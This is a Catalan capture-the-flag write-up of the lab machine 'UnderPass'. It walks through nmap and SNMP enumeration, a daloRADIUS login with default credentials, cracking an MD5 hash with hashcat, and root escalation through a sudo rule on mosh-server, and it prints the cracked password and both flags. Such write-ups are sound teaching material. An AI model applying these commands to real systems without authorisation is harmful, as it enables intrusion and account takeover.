Anirem directament al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:
````
──(kali㉿kali)-[~]
└─$ nmap -sC -sV -v 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 10:29 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:29
Completed NSE at 10:29, 0.00s elapsed
Initiating NSE at 10:29
Completed NSE at 10:29, 0.00s elapsed
Initiating NSE at 10:29
Completed NSE at 10:29, 0.00s elapsed
Initiating Ping Scan at 10:29
Scanning 10.10.11.48 [4 ports]
Completed Ping Scan at 10:29, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:29
Completed Parallel DNS resolution of 1 host. at 10:29, 0.01s elapsed
Initiating SYN Stealth Scan at 10:29
Scanning 10.10.11.48 [1000 ports]
Discovered open port 80/tcp on 10.10.11.48
Discovered open port 22/tcp on 10.10.11.48
Completed SYN Stealth Scan at 10:29, 1.51s elapsed (1000 total ports)
Initiating Service scan at 10:29
Scanning 2 services on 10.10.11.48
Completed Service scan at 10:29, 6.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.48.
Initiating NSE at 10:29
Completed NSE at 10:29, 2.42s elapsed
Initiating NSE at 10:29
Completed NSE at 10:29, 0.20s elapsed
Initiating NSE at 10:29
Completed NSE at 10:29, 0.01s elapsed
Nmap scan report for 10.10.11.48
Host is up (0.080s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

Trobem dos ports oberts, accés a una web pel port 80 i a la que tinguem unes credencials ens podrem connectar per SSH ja que també hi ha accés al port 22 que és el port ssh per defecte. Ara, per tant, afegirem al fitxer /etc/hosts aquesta IP i l'associarem al nom de domini underpass.htb.

Abans de anar al port 80 per el navegador però, farem un wget/curl i un whatweb per veure que hi ha.
````
┌──(kali㉿kali)-[~]
└─$ whatweb http://underpass.htb  
http://underpass.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.48], Title[Apache2 Ubuntu Default Page: It works]
````

Fem un curl però tampoc trobem res rellevant en quant a framworks, etc:


 ````                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ curl http://underpass.htb     
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2022-03-22
    See: https://launchpad.net/bugs/1966004
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Ubuntu, Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }

  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }

  div.page_header {
    height: 180px;
    width: 100%;

    background-color: #F5F6F7;
  }

  div.page_header span {
    margin: 15px 0px 0px 50px;

    font-size: 180%;
    font-weight: bold;
  }

  div.page_header img {
    margin: 3px 0px 0px 40px;

    border: 0px 0px 0px;
  }

  div.banner {
    padding: 9px 6px 9px 6px;
    background-color: #E9510E;
    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
    position: absolute;
    left: 40%;
    bottom: 30px;
    width: 20%;
  }

  div.table_of_contents {
    clear: left;

    min-width: 200px;

    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.table_of_contents_item {
    clear: left;

    width: 100%;

    margin: 4px 0px 0px 0px;

    background-color: #FFFFFF;

    color: #000000;
    text-align: left;
  }

  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }

  div.content_section {
    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.content_section_text {
    padding: 4px 8px 4px 8px;

    color: #000000;
    font-size: 100%;
  }

  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;

    border-width: 1px;
    border-style: dotted;
    border-color: #000000;

    background-color: #F5F6F7;

    font-style: italic;
  }

  div.content_section_text p {
    margin-bottom: 6px;
  }

  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

  div.section_header {
    padding: 3px 6px 3px 6px;

    background-color: #8E9CB2;

    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }

  div.section_header_grey {
    background-color: #9F9386;
  }

  .floating_element {
    position: relative;
    float: left;
  }

  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }

  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }

  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;

    color: #000000;
  }

  div.content_section_text a:hover {
    background-color: #000000;

    color: #DCDFE6;
  }

  div.validator {
  }
    </style>
  </head>
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="icons/ubuntu-logo.png" alt="Ubuntu Logo"
             style="width:184px;height:146px;" class="floating_element" />
        <div>
          <span style="margin-top: 1.5em;" class="floating_element">
            Apache2 Default Page
          </span>
        </div>
        <div class="banner">
          <div id="about"></div>
          It works!
        </div>

      </div>
      <div class="content_section floating_element">
        <div class="content_section_text">
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>

          <p>
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          </p>

        </div>
        <div class="section_header">
          <div id="changes"></div>
                Configuration Overview
        </div>
        <div class="content_section_text">
          <p>
                Ubuntu's Apache2 default configuration is different from the
                upstream default configuration, and split into several files optimized for
                interaction with Ubuntu tools. The configuration system is
                <b>fully documented in
                /usr/share/doc/apache2/README.Debian.gz</b>. Refer to this for the full
                documentation. Documentation for the web server itself can be
                found by accessing the <a href="/manual">manual</a> if the <tt>apache2-doc</tt>
                package was installed on this server.
          </p>
          <p>
                The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
          </p>
          <pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
          </pre>
          <ul>
                        <li>
                           <tt>apache2.conf</tt> is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
                        </li>

                        <li>
                           <tt>ports.conf</tt> is always included from the
                           main configuration file. It is used to determine the listening ports for
                           incoming connections, and this file can be customized anytime.
                        </li>

                        <li>
                           Configuration files in the <tt>mods-enabled/</tt>,
                           <tt>conf-enabled/</tt> and <tt>sites-enabled/</tt> directories contain
                           particular configuration snippets which manage modules, global configuration
                           fragments, or virtual host configurations, respectively.
                        </li>

                        <li>
                           They are activated by symlinking available
                           configuration files from their respective
                           *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
                                a2enmod,
                                a2dismod,
                           </tt>
                           <tt>
                                a2ensite,
                                a2dissite,
                            </tt>
                                and
                           <tt>
                                a2enconf,
                                a2disconf
                           </tt>. See their respective man pages for detailed information.
                        </li>

                        <li>
                           The binary is called apache2 and is managed using systemd, so to
                           start/stop the service use <tt>systemctl start apache2</tt> and
                           <tt>systemctl stop apache2</tt>, and use <tt>systemctl status apache2</tt>
                           and <tt>journalctl -u apache2</tt> to check status.  <tt>system</tt>
                           and <tt>apache2ctl</tt> can also be used for service management if
                           desired.
                           <b>Calling <tt>/usr/bin/apache2</tt> directly will not work</b> with the
                           default configuration.
                        </li>
          </ul>
        </div>

        <div class="section_header">
            <div id="docroot"></div>
                Document Roots
        </div>

        <div class="content_section_text">
            <p>
                By default, Ubuntu does not allow access through the web browser to
                <em>any</em> file outside of those located in <tt>/var/www</tt>,
                <a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html" rel="nofollow">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Ubuntu document root is <tt>/var/www/html</tt>. You
                can make your own virtual hosts under /var/www.
            </p>
        </div>

        <div class="section_header">
          <div id="bugs"></div>
                Reporting Problems
        </div>
        <div class="content_section_text">
          <p>
                Please use the <tt>ubuntu-bug</tt> tool to report bugs in the
                Apache2 package with Ubuntu. However, check <a
                href="https://bugs.launchpad.net/ubuntu/+source/apache2"
                rel="nofollow">existing bug reports</a> before reporting a new bug.
          </p>
          <p>
                Please report bugs specific to modules (such as PHP and others)
                to their respective packages, not to the web server itself.
          </p>
        </div>

      </div>
    </div>
    <div class="validator">
    </div>
  </body>
</html>
````

Com que a la pàgina web tampoc sembla que hi hagi res rellevant ja que hi ha la pàgina per defecte d'apache, "rizaremos el rizo" una mica més amb l'escaneig de ports d'nmap i després si de cas farem un escaneig de directoris i subdominis.

Amb aquest whatweb no veiem cap informació que ens pugui ser gaire rellevant.
Un cop escanejats amb nmap els ports, fem un escaneig de ports UDP amb -sU, per si hi ha algun port UDP que mereix ser comprovat i analitzat:

````
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -sU -v -p 161 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 12:41 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating Ping Scan at 12:41
Scanning 10.10.11.48 [4 ports]
Completed Ping Scan at 12:41, 0.16s elapsed (1 total hosts)
Initiating UDP Scan at 12:41
Scanning underpass.htb (10.10.11.48) [1 port]
Discovered open port 161/udp on 10.10.11.48
Completed UDP Scan at 12:41, 0.27s elapsed (1 total ports)
Initiating Service scan at 12:41
NSE: Script scanning 10.10.11.48.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.55s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.01s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.15s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 1h53m43s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 1h53m43.41s (682341 timeticks)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

NSE: Script Post-scanning.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.64 seconds
           Raw packets sent: 6 (319B) | Rcvd: 2 (168B)
````


Acabem de trobar un tercer port obert, el 161 on hi ha SNMP que és un protocol utilitzat per monitoritzar i gestionar dispositius de xarxa com routers, switches, servidors, etc. El port UDP 161 és utilitzat per rebre comandes SNMP, mentre que el port 162 s'utilitza per enviar notificacions SNMP.

Si el servei està configurat de manera insegura, podem obtenir informació addicional:

````
┌──(kali㉿kali)-[~]
└─$ nmap -sU -p 161 --script snmp-info 161 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 12:57 CET
Nmap scan report for 161 (0.0.0.161)
Host is up (0.00026s latency).

PORT    STATE         SERVICE
161/udp open|filtered snmp

Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.10s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 29
|_  snmpEngineTime: 2h10m08s

Nmap done: 2 IP addresses (2 hosts up) scanned in 8.92 seconds
````


Sembla que no aconseguim gaire informació rellevant, per tant el ChatGPT ens suggereix provar amb una eina anomenada snmpwalk i fer una enumeració a veure què trobem:

 ````                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ snmpwalk -v1 -c public 10.10.11.48
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (799435) 2:13:14.35
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (800957) 2:13:29.57
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 1B 0C 00 38 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 236
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
````

Ara, hem trobat un correu electrònic de contacte "steve@underpass.htb"

Veiem també que es menciona Daloradius, una interfície per gestionar FreeRADIUS (un servidor RADIUS per a autenticació de xarxa). Això podria implicar:
Autenticació d'usuaris.
Configuració de xarxa relacionada amb VPN o Wi-Fi.
Fitxers de configuració potencialment sensibles a explorar.

Una ruta de càrrega del sistema: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
Que revela que l'arrencada utilitza un volum lògic (/dev/mapper), suggerint que probablement hi hagi LVM (Logical Volume Management) configurat al servidor.

Després d'una estona de no trobar res més busquem el directori per defecte del software Daloradius a veure si veiem alguna cosa al login ja que cercant per internet veiem que hauria d'estar aquí: http://SERVER_IP/daloradius/login.php -> https://www.techrepublic.com/article/how-to-install-the-daloradius-web-based-interface-for-freeradius/ :


No hi ha hagut sort i no es troba al mateix directori, i he fet un escaneig de directoris i tampoc l'he trobat:

````                                                                                                                                                                                       
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ dirb http://underpass.htb /usr/share/wordlists/dirb/common.txt           


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec 27 13:12:56 2024
URL_BASE: http://underpass.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://underpass.htb/ ----
+ http://underpass.htb/index.html (CODE:200|SIZE:10671)                                                                                                                                                                                   
dirb http://dev.linkvortex.htb /usr/share/wordlists/dirb/common.txt                                                                                                                                                                        + Remaining scan stats:                                                                                                                                                                                                                   
Words: 1717 | Directories: 0
+ Going to next directory.                                                                                                                                                                                                                
                                                                               
-----------------
END_TIME: Fri Dec 27 13:18:40 2024
DOWNLOADED: 2912 - FOUND: 1

````




Després de no trobar res amb cap dels dos escaneigos de directoris, he tornat a cercar per internet i he trobat que la ruta con hi ha Daloradius és la següent: http://<ip-address>/daloradius/app/operators -> https://kb.ct-group.com/radius-holding-post-watch-this-space/. Per tant, ho torno a provar amb aquesta ruta:

![image](https://github.com/user-attachments/assets/78d3856b-d3f1-4ede-be7a-b891cb034d7e)


EUREKA! Ara hi ha hagut èxit i som al login de Daloradius. He buscat algun CVE o POC a internet i no n'he trobat cap; deu ser un software poc utilitzat ja que em sopren que en beta no tingui res. Ara per tant buscaré si hi ha algunes credencials per defecte que podem utilitzar:

![image](https://github.com/user-attachments/assets/5e2848d2-e4c4-48b7-be78-da1a8e8135c0)


Sembla que sí, per tant les utilitzarem a veure si ens funciona: https://www.techrepublic.com/article/how-to-install-the-daloradius-web-based-interface-for-freeradius/ -> use the default credentials of administrator/radius. 

![image](https://github.com/user-attachments/assets/11437bad-2924-4bff-a6d6-d7f3ec356eca)


I podem fer login correctament, ara som dins del dashboard:

![image](https://github.com/user-attachments/assets/b5de0225-01d9-4541-9dcc-57a375107ae1)


Remenant per el dashboard sembla que hem trobat un usuari i contrasenya que segurament ens han de ser útils per connectar-nos per ssh per el port 22:

![image](https://github.com/user-attachments/assets/f343988d-959c-4e0b-85db-e3acfd56bb67)


I sembla que el hash és de tipus MD5 (412DD4759978ACFCC81DEAB01B382403), per tant ara amb hashcat o john the ripper l'haurem de trencar per obtenir la contrasenya de l'usuari svcMosh:

![image](https://github.com/user-attachments/assets/47086989-5104-41e5-9e34-be9eed5c5956)


Sembla que també li podríem canviar la contrasenya nosaltres al ser usuari administrador, però millor no tocar res per la resta de la gent que també està fent la màquina i per no aixecar sospites si fos un cas real:

![image](https://github.com/user-attachments/assets/fc9c4e9e-3442-4345-8d1a-2aa59fb9caee)


Craquejem el hash amb Crackstation ja que en aquest cas ha funcionat perfectament i per tant ha estat el més ràpid i obtenim la contrasenya:
``
Hash  Type  Result
412DD4759978ACFCC81DEAB01B382403  md5 underwaterfriends
``

![image](https://github.com/user-attachments/assets/85fb5ebb-ccbe-4750-8956-d42d99eafb77)


La contrasenya sembla estar equivocada, per tant ho provaré amb hashcat

````
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ echo 412DD4759978ACFCC81DEAB01B382403 > hash.txt

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 7520U with Radeon Graphics, 1972/4008 MB (512 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

412dd4759978acfcc81deab01b382403:underwaterfriends        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 412dd4759978acfcc81deab01b382403
Time.Started.....: Fri Dec 27 14:13:40 2024 (2 secs)
Time.Estimated...: Fri Dec 27 14:13:42 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1198.8 kH/s (0.20ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2984448/14344385 (20.81%)
Rejected.........: 0/2984448 (0.00%)
Restore.Point....: 2983680/14344385 (20.80%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: undral_5 -> underfalsehope
Hardware.Mon.#1..: Util: 83%

Started: Fri Dec 27 14:12:39 2024
Stopped: Fri Dec 27 14:13:44 2024

````

Després de vàris intents, el problema que estava tenint era que no posava la "M" majúscula de l'usuari ``svcMosh``. Un cp he posat l'usuari de forma correcte ja he pogut accedir a la màquina per ssh amb les credencials de l'usuari que hem trobat i amb això obtenir la user flag:

 ```

┌──(kali㉿kali)-[~]
└─$ ssh svcMosh@underpass.htb
svcMosh@underpass.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec 29 10:16:01 AM UTC 2024

  System load:  0.0               Processes:             230
  Usage of /:   93.1% of 3.75GB   Users logged in:       1
  Memory usage: 17%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 93.1% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Dec 29 09:16:55 2024 from 10.10.16.14
svcMosh@underpass:~$ whoami
svcMosh
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
svcMosh@underpass:~$ cat user.txt
993ea3ad188d3d489c08ae26bd8b09a3

```


Bé, ara escalarem privilegis. No hi ha binaries SUID explotables per tant no hi ha fitxers al sistema amb el bit SUID activat que es puguin utilitzar per obtenir privilegis de root. El següent que mirem i on tenim èxit és els privilegis sudo, veiem que  l'usuari pot executar `mosh-server` amb privilegis de root sense necessitat d'una contrasenya:

```
svcMosh@underpass:~$ sudo -l 
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

Busquem per internet per saber què és Mosh i veiem que Mosh (Mobile Shell) és una aplicació de terminal remota similar a SSH, dissenyada per ser més robusta en connexions inestables. Funciona creant una sessió interactiva entre el client i el servidor mitjançant el protocol UDP. amb això veiem que el punt dèbil és que si un usuari pot executar `mosh-server` com a root sense contrasenya, es pot utilitzar aquest servidor per establir una connexió local amb privilegis elevats. Busquem documentació sobre el seu funcionament: https://www.securityartwork.es/2017/03/08/mosh-mas-alla-del-ssh/  i per tant veiem que l'argument clau és el port `60001` i la clau `MOSH_KEY` que s'utilitzen per establir la connexió hem de seguir aquests passos:

El servidor Mosh permet passar un paràmetre `--server` que especifica com s'ha d'executar el servidor. Aquesta funcionalitat es pot aprofitar per fer que el servidor Mosh s'executi com a **root**.  Per tant, des de la màquina víctima, des de dins del servidor, executem la següent comanda per aprofitar aquesta vulnerabilitat:

`mosh --server="sudo /usr/bin/mosh-server" localhost`

Amb aquesta comanda el que hem fet és redefinir el comportament del servidor Mosh, fent que s'executi amb privilegis de root utilitzant sudo ja que amb localhost connecta localment al servidor Mosh que s'ha configurat amb privilegis elevats.

Un cop fet això, veiem com estem amb l'usuari root i ja obtenim la flag de root:

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Dec 29 11:03:52 AM UTC 2024

  System load:  0.01              Processes:             235
  Usage of /:   96.7% of 3.75GB   Users logged in:       1
  Memory usage: 20%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

  => / is using 96.7% of 3.75GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# whoami
root
root@underpass:~# cat root.txt
a08bcf6b7341c2b7af2c18b8d60fd705
```


